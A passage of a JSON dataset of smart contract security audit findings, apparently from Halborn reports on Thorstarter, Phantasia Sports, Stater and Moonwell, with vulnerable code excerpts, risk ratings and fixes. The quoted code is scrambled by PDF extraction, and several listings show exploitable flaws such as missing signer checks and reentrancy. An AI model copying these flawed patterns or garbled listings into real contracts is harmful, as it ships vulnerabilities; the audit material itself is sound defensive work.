_offeringAmount > 0) { 223 224 225 226 45 227 offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 228 229 } EmissionsPrivateDispenser.sol Listing 29: EmissionsPrivateDispenser.sol (Lines 52,57) uint amount = claimable ( msg . sender ); require ( amount > 0, \" nothing to claim \" ); investorsClaimedAmount [ msg . sender ] += amount ; token . safeTransfer ( msg . sender , amount ); emit Claim ( msg . sender , amount ); 48 function claim () public { 49 50 51 52 53 54 } 55 56 function deposit ( uint amount ) public { 57 58 59 60 } token . safeTransferFrom ( msg . sender , address ( this ) , amount ); totalReceived += amount ; emit Deposit ( amount ); LpTokenVestingKeeper.sol Listing 30: LpTokenVestingKeeper.sol (Lines 115) 112 xruneToken . safeApprove ( dao . voters () , ( amount * 35) / 100) ; 113 IVoters ( dao . voters () ). donate (( amount * 35) / 100) ; 114 115 xruneToken . safeTransfer ( grants , ( amount * 5) / 100) ; 116 117 // Send the leftover 25% to the DAO 118 xruneToken . transfer ( address ( dao ) , xruneToken . balanceOf ( address ( this ))); 119 emit Claim ( lpVesters [i ], lpVestersSnapshotIds [ i], amount ); LpTokenVesting.sol 46 Listing 31: LpTokenVesting.sol 100 IERC20 ( pair () ). safeTransfer ( msg . sender , amount ); Listing 32: LpTokenVesting.sol 166 IERC20 ( token ). safeTransfer ( msg . sender , amount ); VotersInvestmentDispenser.sol Listing 33: VotersInvestmentDispenser.sol (Lines 46,53,61) uint amount = claimable ( snapshotId , msg . sender ); if ( amount > 0) { claimedAmounts [ snapshotId ][ msg . sender ] += amount ; claimedAmountsTotals [ snapshotId ] += amount ; xruneToken . safeTransfer ( msg . sender , amount ); emit Claim ( snapshotId , msg . sender , amount ); 41 function claim ( uint snapshotId ) public { 42 43 44 45 46 47 48 49 } 50 51 // Used by LpTokenVestingKeeper 52 function deposit ( uint snapshotId , uint amount ) public { 53 } xruneToken . safeTransferFrom ( msg . sender , address ( this ) , amount ) ; snapshotAmounts [ snapshotId ] += amount ; emit Deposit ( snapshotId , amount ); 54 55 56 } 57 58 // Allow DAO to get tokens out and migrate to a different contract 59 function withdraw ( address token , uint amount ) public { require ( msg . sender == address ( dao ) , '! DAO '); 60 IERC20 ( token ). safeTransfer ( address ( dao ) , amount ); 61 62 } EmissionsSplitter.sol Listing 34: EmissionsSplitter.sol 99 token . safeTransfer ( team , teamAmount ); 47 Listing 35: EmissionsSplitter.sol 113 token . safeTransfer ( team , teamAmount ); Listing 36: EmissionsSplitter.sol (Lines 123,127) sentToEcosystem += ecosystemAmount ; amount -= ecosystemAmount ; token . safeTransfer ( ecosystem , ecosystemAmount ); 120 if ( ecosystemAmount > 0) { 121 122 123 124 } 125 126 if ( amount > 0) { 127 128 } token . safeTransfer ( dao , amount ); OpenZeppelin Listing 37: Library SafeERC20 (Lines 20,25,28,34) using Address for address ; 17 library SafeERC20 { 18 19 20 21 22 23 24 25 function safeTransfer ( IERC20 token , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transfer . selector , to , value )) ; } function safeTransferFrom ( IERC20 token , address from , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transferFrom . selector , from , to , value )) ; } 26 27 28 29 30 31 32 33 34 35 48 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Whenever tokens are transferred, the delta of the previous (before transfer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: RISK ACCEPTED: Thorstarter Team claims that most of the tokens addresses are contracts self-deployed by Thorstarter or check before hand. 49 3.10 (HAL-10) USE OF BLOCK.TIMESTAMP - LOW ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: Informational"
        ]
    },
    {
        "title": "ANONYMOUS SELL ORDER CANCELLING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Owners can place sell orders on their NFTs by sending either a ListNftForSale instruction or a ListEditionForSale instruction to the program. Either instruction handler transfers the tokens authority to an account address derived from the programs ID and a static seed and creates an order account. This account stores the ask price, NFT mint and several other parameters. Sellers may choose to cancel their orders before theyre filled. To accom- plish that, they can send either a CancelNftSale or a CancelEditionSale. Either instruction handler transfers the NFTs authority back to the seller (NFT owner) and closes the order account, sending the rent back to the seller. However, because neither the CancelNftSale instruction handler nor the CancelEditionSale instruction handler verifies if the NFT owner is, in fact, a transaction signer, an anonymous attacker may cause a DoS of the program by cancelling all sell orders. Code Location: Listing 1: processor/cancel_listing.rs (Lines 22) 20 pub fn process_cancel_listing ( accounts : &[ AccountInfo ], program_id 21 22 23 24 25 : & Pubkey ) -> ProgramResult { let account_info_iter = & mut accounts . iter () ; let seller_wallet_account = next_account_info ( account_info_iter ) ?; let selling_nft_token_account = next_account_info ( account_info_iter ) ?; let sell_order_data_storage_account = next_account_info ( account_info_iter ) ?; let nft_store_signer_pda_account = next_account_info ( account_info_iter ) ?; 13 26 let token_program = next_account_info ( account_info_iter ) ?; The only check performed on the seller account by the instruction handler. Listing 2: processor/cancel_listing.rs (Lines 63) 63 if sell_order_data . seller_wallet ! = * seller_wallet_account . key { 64 65 66 } msg! ( \" PhantasiaError :: SellerMismatched \" ); return Err ( PhantasiaError :: SellerMismatched . into () ); Listing 3: processor/cancel_edition_listing.rs (Lines 25) accounts : &[ AccountInfo ], program_id : & Pubkey , 20 pub fn process_cancel_edition_listing ( 21 22 23 ) -> ProgramResult { 24 25 let account_info_iter = & mut accounts . iter () ; let seller_wallet_account = next_account_info ( account_info_iter ) ?; 26 27 28 29 let selling_nft_token_account = next_account_info ( account_info_iter ) ?; let sell_order_data_storage_account = next_account_info ( account_info_iter ) ?; let nft_store_signer_pda_account = next_account_info ( account_info_iter ) ?; let token_program = next_account_info ( account_info_iter ) ?; 14 The only check performed on the seller account by the instruction handler. Listing 4: processor/cancel_edition_listing.rs (Lines 66) 66 if sell_order_data . seller_wallet ! = * seller_wallet_account . key { 67 68 69 } msg! ( \" PhantasiaError :: SellerMismatched \" ); return Err ( PhantasiaError :: SellerMismatched . into () ); Risk Level: Likelihood - 5 Impact - 4 Recommendation: Verify if the NFT owner (seller) is indeed the signer of CancelNftSale and CancelEditionSale instructions before updating the state. Remediation Plan: The Phantasia Sports SOLVED: commit team 5a1b332897736200f6d793852891ac179144c48d: the transaction signer public key is verified to match the seller_wallet account address saved in the sale order. fixed issue this in 15 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_NFT_Store_SPA_Solana_Program",
            "Severity: High"
        ]
    },
    {
        "title": "HARDCODED VAULT ADDRESS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "requires compiler the environment the Rust TREASURY_ATA_PUBKEY program. The BuyNft and BuyEdition instruction handlers use the value of this variable to get the fee vault address. Since this address is hardcoded at compile time, it cannot be modified without redeploying the program if the account compromised. developer to program variable to the build set Code Location: Listing 5: processor/buy_nft.rs (Lines 46) \" TREASURY_ATA_PUBKEY \" , \" Must specify a treasury ATA account public key! \" 45 let transaction_fee_fant_ata_id = Pubkey :: from_str ( env! ( 46 47 48 )) 49 . map_err (| _ | PhantasiaError :: StringToPubkeyConversionFailed ) ?; 50 if * transaction_fee_fant_ata . key ! = transaction_fee_fant_ata_id { 51 52 \" PhantasiaError :: TransactionFeeFantAtaMismatched EXPECTED : msg! ( {:?} ACTUAL : {:?} \" , transaction_fee_fant_ata_id , transaction_fee_fant_ata . key ); return Err ( PhantasiaError :: TransactionFeeFantAtaMismatched . into () ); 53 54 55 56 57 } Listing 6: processor/buy_edition.rs (Lines 58) \" TREASURY_ATA_PUBKEY \" , \" Must specify a treasury ATA account public key! \" 57 let transaction_fee_fant_ata_id = Pubkey :: from_str ( env! ( 58 59 60 )) 61 . map_err (| _ | PhantasiaError :: StringToPubkeyConversionFailed ) ?; 16 62 if * transaction_fee_fant_ata . key ! = transaction_fee_fant_ata_id { 63 64 \" PhantasiaError :: TransactionFeeFantAtaMismatched EXPECTED : msg! ( {:?} ACTUAL : {:?} \" , transaction_fee_fant_ata_id , transaction_fee_fant_ata . key ); return Err ( PhantasiaError :: TransactionFeeFantAtaMismatched . into () ); 65 66 67 68 69 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Implement a governance function to update the fee vault address. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team accepts the risk of this finding. 17 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_NFT_Store_SPA_Solana_Program",
            "Severity: Medium"
        ]
    },
    {
        "title": "NFT ORDER TYPE MISMATCH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "SellOrder and The program creates two types of NFT sell orders: NFTs may be either single- or multiple edition. LimitedEditionSale. Editions are Edition ID is stored in NFT metadata as edition_nonce. identified with u8 integer, but for single edition NFTs this property is set to None. Neither the ListNftForSale nor the ListEditionForSale instruction handler checks the value of the edition_nonce property, which means the NFT owner may place a SellOrder order for a multiple edition NFT and a LimitedEditionSale order for a single edition NFT. Code Location: Listing 7: processor/list_nft.rs (Lines 158,161) selling_nft_token_account . lamports () , selling_nft_token_account . data_len () , msg! ( \" PhantasiaError :: NotRentExempt \" ); return Err ( PhantasiaError :: NotRentExempt . into () ); 150 if !rent . is_exempt ( 151 152 153 ) { 154 155 156 } 157 158 validate_nft ( 159 160 161 162 163 ) ?; selling_nft_mint_account , selling_nft_token_account , selling_nft_metadata_account , seller_wallet_account . key , 18 Listing 8: processor/list_nft.rs (Lines 57) nft_mint : & AccountInfo , nft_token_account : & AccountInfo , metadata_info : & AccountInfo , seller_wallet_pubkey : & Pubkey , 43 pub fn validate_nft ( 44 45 46 47 48 ) -> ProgramResult { 49 50 51 52 53 54 55 56 57 58 59 60 61 let verified_creators : [ Pubkey ; NUM_VERIFIED_CREATORS ] = [ vc1_id :: id () , // This is our main wallet vc2_id :: id () , vc3_id :: id () , vc4_id :: id () , vc5_id :: id () , vc6_id :: id () , // Phanbot creator ]; validate_metadata_account ( metadata_info , nft_mint . key ) ?; if * nft_token_account . owner != spl_token :: id () { msg! (\" PhantasiaError :: AccountOwnerShouldBeTokenProgram \" ); return Err ( PhantasiaError :: AccountOwnerShouldBeTokenProgram . into () ); 62 } Listing 9: processor/list_nft.rs (Lines 57) nft_mint : & AccountInfo , nft_token_account : & AccountInfo , metadata_info : & AccountInfo , seller_wallet_pubkey : & Pubkey , 43 pub fn validate_nft ( 44 45 46 47 48 ) -> ProgramResult { 49 50 51 52 53 54 55 56 57 58 59 60 let verified_creators : [ Pubkey ; NUM_VERIFIED_CREATORS ] = [ vc1_id :: id () , // This is our main wallet vc2_id :: id () , vc3_id :: id () , vc4_id :: id () , vc5_id :: id () , vc6_id :: id () , // Phanbot creator ]; validate_metadata_account ( metadata_info , nft_mint . key ) ?; if * nft_token_account . owner != spl_token :: id () { msg! (\" PhantasiaError :: AccountOwnerShouldBeTokenProgram \" ); 19 61 62 } return Err ( PhantasiaError :: AccountOwnerShouldBeTokenProgram . into () ); Listing 10: processor/list_nft.rs 252 pub fn validate_metadata_account ( metadata_info : & AccountInfo , nft_mint : & Pubkey ) -> ProgramResult { verify_metadata_account_owner ( metadata_info . owner ) ?; let metadata_program_id = metadata_program_id :: id () ; let metadata_seeds = &[ metaplex_state :: PREFIX . as_bytes () , metadata_program_id . as_ref () , nft_mint . as_ref () , ]; let ( metadata_address , _ ) = Pubkey :: find_program_address ( metadata_seeds , & metadata_program_id :: id () ); if metadata_address ! = * metadata_info . key { msg! (\" PhantasiaError :: MetadataAccountMismatched \" ); return Err ( PhantasiaError :: MetadataAccountMismatched . into 253 254 255 256 257 258 259 260 261 262 263 264 265 () ); 266 267 268 } } Ok (() ) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Check the edition_nonce value before creating and placing sell orders. 20 Remediation Plan: The Phantasia Sports commit SOLVED: the value of edition_nonce 6b36c56025ae1ed8bfc869dc7015413a25e1b8b3: is checked in the validate_nft function, used by ListNftForSale and ListEditionForSale, to verify that it is expected sales order type. issue fixed this team in 21 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_NFT_Store_SPA_Solana_Program",
            "Severity: Low"
        ]
    },
    {
        "title": "FANT AMOUNT CASTING OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The program calculates the FANT amount the seller receives with the get_fants_to_receive_from_basis_points function. This function takes a u64 selling_price and u16 basis_points and performs some arithmetic op- erations on them. The result is cast to u64 to match the type of the amount field of SPL Tokens Account struct. Before casting however the result is not verified to not exceed the maximum value allowed by the u64 type which can lead to integer overflow. Code Location: Listing 11: processor/buy_nft.rs (Lines 206) selling_price : u64 , basis_points : u16 , let amount_to_receive = ( selling_price as u128 ) 198 pub fn get_fants_to_receive_from_basis_points ( 199 200 201 ) -> Result < u64 , ProgramError > { 202 203 204 205 206 207 208 } . checked_mul ( basis_points as u128 ) . ok_or ( PhantasiaError :: MathOverflow )? . checked_div (10000 u128 ) . ok_or ( PhantasiaError :: MathOverflow )? as u64 ; return Ok ( amount_to_receive ); Risk Level: Likelihood - 2 Impact - 2 22 Recommendation: Verify amount_to_receive does not exceed u64::MAX before casting it to u64. Remediation Plan: The Phantasia Sports commit SOLVED: 6b36c56025ae1ed8bfc869dc7015413a25e1b8b3: is verified to not exceed the maximum value allowed by the u64 type to avoid an integer overflow. amount_to_receive issue fixed team this the in 23 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_NFT_Store_SPA_Solana_Program",
            "Severity: Low"
        ]
    },
    {
        "title": "EDITION SELL ORDER PARAMETER SANITY CHECK MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ListEditionForSale instruction handler requires the NFT owner to The provide some parameters, including number_to_sell and num_sold. former denotes the total number of NTFs available, and the latter stores the number of NFTs sold to date. The handler does not verify if num_sold is lower than number_to_sell which means it is possible to place a sell order on an NFT edition where the number of sold tokens exceeds the number of tokens available for sale. Code Location: Listing 12: processor/list_edition.rs (Lines 23,24) accounts : &[ AccountInfo ], program_id : & Pubkey , sale_price : u64 , number_to_sell : u16 , num_sold : u16 19 pub fn process_list_edition_nft ( 20 21 22 23 24 25 ) -> ProgramResult { 26 27 let account_info_iter = & mut accounts . iter () ; let seller_wallet_account = next_account_info ( account_info_iter ) ?; Listing 13: processor/list_edition.rs (Lines 118,119) 113 let sell_order_data : LimitedEditionSale = LimitedEditionSale { 114 115 116 117 118 acc_type : AccTypesWithVersion :: LimitedEditionSaleDataV1 as u8 , seller_wallet : * seller_wallet_account . key , nft_token : * selling_nft_token_account . key , selling_price : sale_price , number_purchased : num_sold , 24 119 120 121 }; number_to_sell : number_to_sell , nonce : bump_seed , Risk Level: Likelihood - 1 Impact - 1 Recommendation: Verify num_sold is a lower number than number_to_sell before placing the sell order. Remediation Plan: The Phantasia Sports SOLVED: 32ff199c83cdedf061aaeef706c75c9a4c7ed510: the num_sold is verified not to exceed the number of available tokens, number_to_sell. commit fixed issue team this in 25 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_NFT_Store_SPA_Solana_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF HELPER METHODS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The intention and use of helper methods in Rust, like unwrap, is very useful for testing environments because a value is forcibly demanded to get an error (aka panic!) if the Option the methods is called on doesnt have Some value or Result. Nevertheless, leaving unwrap functions in production environments is a bad practice because not only will this In addition, no helpful cause the program to crash out, or panic!. messages are shown to help the user solve, or understand the reason of the error. Code Location: Listing 14: processor/list_nft.rs (Lines 103) 102 let metadata = Metadata :: from_account_info ( metadata_info ) ?; 103 let nft_creators = metadata . data . creators . unwrap () ; 104 let mut is_fake_nft = true ; 105 for creator in nft_creators { 106 if creator . verified && is_verified_creator (& creator . address , & verified_creators )? { is_fake_nft = false ; break ; 107 108 109 110 } } Risk Level: Likelihood - 1 Impact - 1 26 Recommendation: It is recommended not use the unwrap function in production environment because this use provokes panic! and may crash the contract without verbose error messages. Crashing the system will result in a loss of availability, and in some cases, even private information stored in the Some alternatives are possible, such as propagating the error state. with ? instead of unwrap, or using the error-chain crate for errors. Remediation Plan: The Phantasia Sports SOLVED: commit unwrap 68463a47fdd1a9be18b14ead9891806cb96be9d9: function has been removed and replaced by more secure methods such as error propagation. issue of in the fixed team this use any 27 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_NFT_Store_SPA_Solana_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "BUYING NFTS AS A DELEGATE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Both BuyNft and BuyEdition instruction handlers expect the transaction sender to provide the buyer_nft_fant_ata FANT token account to charge and buyer_wallet_account to authorize the transfer. If is buyer_wallet_account. transferred successful, authority NFTs the to is it In the SPL Token program, an account delegate is defined as an account authorized to transfer an owner-approved share of tokens out of the account. Neither the BuyNft nor BuyEdition instruction handler verifies if buyer_wallet_account is the owner of the buyer_nft_fant_ata account rather than just a delegate which means if the transaction is signed by a delegate, the NFTs authority will be transferred to the delegate instead of the buyer_nft_fant_ata account owner. Code Location: Listing 15: processor/buy_nft.rs (Lines 29,30) 27 pub fn process_buy_nft ( accounts : &[ AccountInfo ], program_id : & Pubkey ) -> ProgramResult { let account_info_iter = & mut accounts . iter () ; let buyer_wallet_account = next_account_info ( account_info_iter ) ?; let buyer_nft_fant_ata = next_account_info ( account_info_iter ) 28 29 30 ?; 28 Listing 16: processor/buy_nft.rs (Lines 40) 40 if !buyer_wallet_account . is_signer { 41 42 43 msg! (\" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); } 29 the only check on buyer_wallet_account Listing 17: processor/buy_nft.rs (Lines 40) 40 if !buyer_wallet_account . is_signer { 41 42 43 msg! (\" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); } Listing 18: processor/buy_edition.rs (Lines 36,47) 35 let mint_authority_info = next_account_info ( account_info_iter ) ?; 36 let buyer_wallet_account = next_account_info ( account_info_iter ) ?; 37 let nft_store_signer_pda_account = next_account_info ( account_info_iter ) ?; 38 let master_edition_token_account_info = next_account_info ( account_info_iter ) ?; 39 let update_authority_info = next_account_info ( account_info_iter ) ?; 40 let master_metadata_account_info = next_account_info ( account_info_iter ) ?; 41 let token_program_account_info = next_account_info ( account_info_iter ) ?; 42 let system_account_info = next_account_info ( account_info_iter ) ?; 43 let rent_info = next_account_info ( account_info_iter ) ?; 44 let metadata_program_id_account = next_account_info ( account_info_iter ) ?; 45 let metadata_mint_info = next_account_info ( account_info_iter ) ?; 46 47 let buyer_nft_fant_ata = next_account_info ( account_info_iter ) ?; the only check on buyer_wallet_account Listing 19: processor/buy_edition.rs (Lines 52) 52 if !buyer_wallet_account . is_signer { 53 54 55 msg! (\" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); } 30 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Verify the buyer_wallet_account to be the owner of the buyer_nft_fant_ata account before transferring NFT authority. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team do not believe that any of the platform users are going to ever use delegation to purchase NFTs from the store. 31 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_NFT_Store_SPA_Solana_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "ALL NFT EDITION SALE PROFITS ARE TRANSFERRED TO THE FEE VAULT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "NFT owners can post sell orders on NFTs or NFT editions. When a user buys a single-edition NFT, a fixed percentage is deducted from the ask price and transferred to the fee vault. When a user buys an NFT edition, however, 100% of the ask price is transferred to the fee vault and the NFT owner receives nothing. Code Location: Listing 20: processor/buy_edition.rs (Lines 135) & spl_token :: instruction :: transfer ( token_program_account_info . key , buyer_nft_fant_ata . key , transaction_fee_fant_ata . key , buyer_wallet_account . key , &[] , seller_to_receive_fants , 128 let seller_to_receive_fants = sell_order_data . selling_price ; 129 130 msg! (\" Calling the token program to transfer FANT to Treasury ... \"); 131 invoke ( 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 ) ?; buyer_nft_fant_ata . clone () , transaction_fee_fant_ata . clone () , buyer_wallet_account . clone () , token_program_account_info . clone () , )?, &[ ], 32 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Restrict access to the ListEditionForSale instruction handler to a wallet that owns the fee vault. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team states that the idea is that edition sales will be only performed by the team and would like all proceeds to be sent directly to the treasury. 33 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_NFT_Store_SPA_Solana_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "USAGE OF BLOCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_Lending_Contracts_Smart_Contract_Security_Audit_Halborn_V_1_1.pdf",
        "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: LendingCore.sol Line #133 LendingMethods.sol 12 LendingMethods.sol LendingMethods.sol 13 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: Solved: because their timescales are higher than 900 seconds. Stater team assumes that the use of block.timestamp is safe ",
        "labels": [
            "Halborn",
            "Stater_Lending_Contracts",
            "Severity: Low"
        ]
    },
    {
        "title": "FOR LOOP OVER DYNAMIC ARRAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_Lending_Contracts_Smart_Contract_Security_Audit_Halborn_V_1_1.pdf",
        "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, 14 based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Just by having too large an array of users to pay can max out the gas limit and prevent the transaction from ever succeeding. Code Location:  LendingMethods.sol Line #~315  LendingMethods.sol Line #~329 15 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. Remediation Plan: Risk Accepted: Stater team considers appropriate the use of loops. 16 3.3 WORKFLOW TESTING ",
        "labels": [
            "Halborn",
            "Stater_Lending_Contracts",
            "Severity: Informational"
        ]
    },
    {
        "title": "ALLOWING ERC777",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ERC777 standard allows the token contract to notify senders and recipients when ERC777 tokens are sent or received from their accounts with function hooks. If the recipient of the token is a smart contract, the smart contract may cause to re-entrancy by calling another transfer function. These hooks are called as callbacks. During the tests, it was seen that the protocol could be affected by this This may vulnerability if ERC777-kind tokens are planned to be used. cause loss of funds. Code Location: Listing 1: MToken.sol (Lines 701,702,717) 696 697 698 699 700 701 702 703 704 705 706  ); 707 708 709 // /////////////////////// // EFFECTS & INTERACTIONS // ( No safe failures beyond this point ) /* We write previously calculated values into storage */ totalSupply = vars . totalSupplyNew ; accountTokens [ redeemer ] = vars . accountTokensNew ; /* We emit a Transfer event , and a Redeem event */ emit Transfer ( redeemer , address ( this ) , vars . redeemTokens ); emit Redeem ( redeemer , vars . redeemAmount , vars . redeemTokens /* We call the defense hook */ comptroller . redeemVerify ( address ( this ) , redeemer , vars .  redeemAmount , vars . redeemTokens ); 710 711 /* 13 712 * We invoke doTransferOut for the redeemer and the  redeemAmount . Note : The mToken must handle variations between ERC -20 713 *  and GLMR underlying . * * 714 715 On success , the mToken has redeemAmount less of cash . doTransferOut reverts if anything goes wrong , since we  can 't be sure if side effects occurred . 716 717 718 719 */ doTransferOut ( redeemer , vars . redeemAmount ); return uint ( Error . NO_ERROR ); Risk Level: Likelihood - 4 Impact - 3 Recommendation: The supported tokens should be white-listed to ensure that no hijacking Furthermore, check- mechanism could be implemented, such as ERC777. effect-interactions should be controlled properly to avoid any re-entrancy issue. Remediation Plan: SOLVED: Moonwell Team solved this issue by implementing Reentrancy Guard and better check-effect-interaction design to Comptroller.sol contract. Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e && 762cdc4cd9a8d09f29765f9e143b25af0ebe9720 14 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "USE OF DEPRECATED CHAINLINK API",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ChainlinkOracle contract uses Chainlinks deprecated API latestAnswer (). Such functions might suddenly stop working if Chainlink stopped supporting deprecated APIs. This method will return the last value, but it is possible to check if the data is fresh. Code Location: Listing 2: ChainlinkOracle.sol (Lines 57,59) // Chainlink USD - denominated feeds store answers at 8 uint decimalDelta = uint (18) . sub ( feed . decimals () ); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { 52 function getChainlinkPrice ( AggregatorV2V3Interface feed ) internal  view returns ( uint ) { 53  decimals 54 55 56 57  ; 58 59 60 61 return uint ( feed . latestAnswer () ). mul (10** decimalDelta ) return uint ( feed . latestAnswer () ); } else { } } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use latestRoundData() method instead of latestAnswer (). This method allows executing some extra validations as shown as below: 15 Listing 3: Extra Validations (Lines 2,3,4) 1 ( roundId , rawPrice , , updateTime , answeredInRound ) =  AggregatorV3Interface ( feed ). latestRoundData () ; 2  than 0 \"); 3 4 require ( updateTime != 0 , \" Round is in incompleted state \"); require ( answeredInRound >= roundId , \" Stale price \" ); require ( rawPrice > 0, \" Chainlink price cannot be lower Remediation Plan: SOLVED: This issue was solved by implementing better ChainLink Oracle API call (latestRoundData()). Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e && 762cdc4cd9a8d09f29765f9e143b25af0ebe9720. 16 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "ASSETS MAY LOCKED DOWN ON GOVERNORALPHA CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Eth sent to Timelock will be locked in current implementation. Code Location: Listing 4: GovernorAlpha.sol (Line 205) 200 function execute ( uint proposalId ) external { 201 require ( state ( proposalId ) == ProposalState . Queued , \"  GovernorAlpha :: execute : proposal can only be executed if it is  queued \"); 202 203 204 205 Proposal storage proposal = proposals [ proposalId ]; proposal . executed = true ; for ( uint i = 0; i < proposal . targets . length ; i ++) { timelock . executeTransaction ( proposal . targets [ i],  proposal . values [i ], proposal . signatures [ i], proposal . calldatas [ i],  proposal . eta ); 206 207 208 } } emit ProposalExecuted ( proposalId ); Proof Of Concept:  Set up the governance contracts (GovernanceAlpha, Timelock).  Send eth to timelock contract.  Set up a proposal to send 0.1 eth out. Code snippet in ether.js below. proxy refers to GovernorAlpha. Listing 5 1 2 3 4 await proxy . propose ( [ signers [3]. address ], [ ethers . utils . parseEther ( \" 0.1 \")] , [\" \" ], 17 5 6 7 ); [ ethers . BigNumber . from (0) ] , \" Send funds to 3 rd signer \"  Vote and have the proposal succeed.  Execute the proposal, the proposal number here is arbitrary. Listing 6 1 await proxy . execute (2) ; 2 await proxy . execute (2 , { value : ethers . utils . parseEther (\" 0.1 \" ) })  // this would work // this fails  0.1 eth will be sent out, but it is sent from the msg.sender not from the timelock contract. Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider applying the following changes. Listing 7 function execute ( uint proposalId ) external { require ( state ( proposalId ) == ProposalState . Queued , \" 1 2  GovernorAlpha :: execute : proposal can only be executed if it is  queued \"); 3 4 5 6  proposal . values [i ], proposal . signatures [ i], proposal . calldatas [ i],  proposal . eta ); Proposal storage proposal = proposals [ proposalId ]; proposal . executed = true ; for ( uint i = 0; i < proposal . targets . length ; i ++) { timelock . executeTransaction ( proposal . targets [ i], 18 7 8 9 } } emit ProposalExecuted ( proposalId ); Reference: https://github.com/compound-finance/compound-protocol/pull/177/files Remediation Plan: SOLVED: This issue was solved 